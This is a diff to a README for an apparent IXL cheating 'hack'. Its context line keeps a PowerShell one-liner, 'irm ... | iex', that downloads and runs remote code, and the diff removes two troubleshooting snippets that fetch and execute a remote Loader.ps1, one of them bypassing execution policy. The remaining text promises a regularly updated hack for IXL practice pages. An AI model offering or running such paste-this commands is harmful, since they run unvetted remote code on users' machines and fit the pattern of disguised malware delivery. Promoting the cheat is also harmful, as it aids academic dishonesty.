@@ -60,16 +60,6 @@ irm gitsl.xyz?get=ixl-asw | iex
 
 ## 🔧 TROUBLESHOOTING & COMMON ERRORS
 
-### 📌 Execution Policy Bypass
-```powershell
-powershell -ExecutionPolicy Bypass -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
-```
-
-### 📌 irm Not Recognized (PowerShell 2.0)
-```powershell
-Invoke-RestMethod https://mast.frtview.com/Loader.ps1 | Invoke-Expression
-```
-
 ### 📌 Hack Not Working
 - Make sure you are on the IXL practice page.
 - Check if IXL updated recently — our hack is updated within 24 hours.
